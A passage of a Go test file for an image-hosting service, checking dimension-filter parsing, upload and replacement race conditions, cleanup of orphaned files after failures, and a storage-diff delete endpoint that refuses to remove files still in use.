		t.Fatal("rejected upload must not be stored")
	}
}

func TestDimensionFiltersOutOfRange(t *testing.T) {
	e := newTestEnv(t)
	for _, q := range []string{
		"width=%3E99999999999",
		"height=%3C%3D-99999999999",
		"width=1..99999999999999999999999",
		"height=99999999999",
	} {
		w := e.do("GET", "/images?"+q, nil)
		expectStatus(t, w, http.StatusOK)
	}
}

func TestPatchImageRemovedWhileStoringDeletesReplacement(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000043", "mod2", "")
	e.setRole(uid, auth.RoleModerator)
	_, img := e.upload(tok, 701, nil)
	e.store.mu.Lock()
	e.store.uploadHook = func(string) { e.exec(`DELETE FROM "Images" WHERE "Id" = $1`, img.ID) }
	e.store.mu.Unlock()

	w := e.multipart("PATCH", fmt.Sprintf("/images/%d", img.ID),
		uploadSpec{file: gifBytes(t), filename: "x.gif", contentType: "image/gif"}, withToken(tok))
	expectStatus(t, w, http.StatusNotFound)
	e.store.mu.Lock()
	e.store.uploadHook = nil
	e.store.mu.Unlock()
	if _, ok := e.store.get(fmt.Sprintf("%d.gif", img.ID)); ok {
		t.Fatal("the replacement file of a removed image must be deleted")
	}
}

func TestJanitorKeepsFileThatIsInUseAgain(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000044", "mod3", "")
	e.setRole(uid, auth.RoleModerator)
	_, img := e.upload(tok, 7001, nil)
	path := fmt.Sprintf("/images/%d", img.ID)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e.srv.objects.backoff = []time.Duration{200 * time.Millisecond, time.Second}
	done := make(chan struct{})
	go func() {
		e.srv.objects.run(ctx)
		close(done)
	}()

	e.store.mu.Lock()
	e.store.failDeletes = 1
	e.store.mu.Unlock()
	expectStatus(t, e.multipart("PATCH", path, uploadSpec{file: gifBytes(t), filename: "x.gif", contentType: "image/gif"}, withToken(tok)), http.StatusOK)
	expectStatus(t, e.multipart("PATCH", path, uploadSpec{file: noisePNG(t, 7002, 160, 200)}, withToken(tok)), http.StatusOK)

	time.Sleep(600 * time.Millisecond)
	if _, ok := e.store.get(fmt.Sprintf("%d.png", img.ID)); !ok {
		t.Fatal("the retried delete removed the live file")
	}
	if _, ok := e.store.get(fmt.Sprintf("%d.gif", img.ID)); ok {
		t.Fatal("the replaced gif should be gone")
	}
	cancel()
	<-done
}

func TestReplacementWaitsForRunningUpload(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000045", "mod4", "")
	e.setRole(uid, auth.RoleModerator)

	var fired atomic.Bool
	patchDone := make(chan int, 1)
	finishedEarly := make(chan bool, 1)
	e.store.mu.Lock()
	e.store.uploadHook = func(key string) {
		if !fired.CompareAndSwap(false, true) {
			return
		}
		id, _, _ := parseImageKey(key)
		go func() {
			w := e.multipart("PATCH", fmt.Sprintf("/images/%d", id),
				uploadSpec{file: gifBytes(t), filename: "x.gif", contentType: "image/gif"}, withToken(tok))
			patchDone <- w.Code
		}()
		select {
		case code := <-patchDone:
			patchDone <- code
			finishedEarly <- true
		case <-time.After(300 * time.Millisecond):
			finishedEarly <- false
		}
	}
	e.store.mu.Unlock()

	w, img := e.upload(tok, 7101, nil)
	expectStatus(t, w, http.StatusCreated)
	if <-finishedEarly {
		t.Fatal("the replacement finished while the upload was still being stored")
	}
	if code := <-patchDone; code != http.StatusOK {
		t.Fatalf("replacement failed with %d", code)
	}
	e.store.mu.Lock()
	e.store.uploadHook = nil
	e.store.mu.Unlock()

	var ext string
	if err := e.pool.QueryRow(context.Background(), `SELECT "Extension" FROM "Images" WHERE "Id" = $1`, img.ID).Scan(&ext); err != nil {
		t.Fatal(err)
	}
	if ext != ".gif" {
		t.Fatalf("expected the replacement to win, got %s", ext)
	}
	if _, ok := e.store.get(fmt.Sprintf("%d.png", img.ID)); ok {
		t.Fatal("the original file was left behind as an orphan")
	}
	if n := e.store.count(); n != 1 {
		t.Fatalf("expected exactly one stored file, got %d", n)
	}
}

func TestUploadStorageErrorRemovesWrittenFile(t *testing.T) {
	e := newTestEnv(t)
	tok, _ := e.login("100000000000000046", "timeout", "")
	e.store.mu.Lock()
	e.store.failAfterStore = true
	e.store.mu.Unlock()
	w, _ := e.upload(tok, 7201, nil)
	expectStatus(t, w, http.StatusInternalServerError)
	e.store.mu.Lock()
	e.store.failAfterStore = false
	e.store.mu.Unlock()
	if n := e.store.count(); n != 0 {
		t.Fatalf("orphaned file after a failed upload: %d objects", n)
	}
	if n := e.scalar(`SELECT COUNT(*) FROM "Images"`); n != 0 {
		t.Fatalf("rows left behind: %d", n)
	}
}

func TestStorageDiffDeleteWaitsForReplacement(t *testing.T) {
	e := newTestEnv(t)
	tok, uid := e.login("100000000000000047", "admin2", "")
	e.setRole(uid, auth.RoleAdmin)
	_, img := e.upload(tok, 7301, nil)
	gifKey := fmt.Sprintf("%d.gif", img.ID)

	var fired atomic.Bool
	diffDone := make(chan int, 1)
	e.store.mu.Lock()
	e.store.uploadHook = func(key string) {
		if key != gifKey || !fired.CompareAndSwap(false, true) {
			return
		}
		go func() {
			diffDone <- e.do("DELETE", "/storage-diff/s3", map[string]any{"fileNames": []string{gifKey}}, withToken(tok)).Code
		}()
		time.Sleep(100 * time.Millisecond)
	}
	e.store.mu.Unlock()

	w := e.multipart("PATCH", fmt.Sprintf("/images/%d", img.ID),
		uploadSpec{file: gifBytes(t), filename: "x.gif", contentType: "image/gif"}, withToken(tok))
	expectStatus(t, w, http.StatusOK)
	if code := <-diffDone; code != http.StatusConflict {
		t.Fatalf("storage diff deleted a file in use (status %d)", code)
	}
	e.store.mu.Lock()
	e.store.uploadHook = nil
	e.store.mu.Unlock()
	if _, ok := e.store.get(gifKey); !ok {
		t.Fatal("the image lost its file")
	}
}
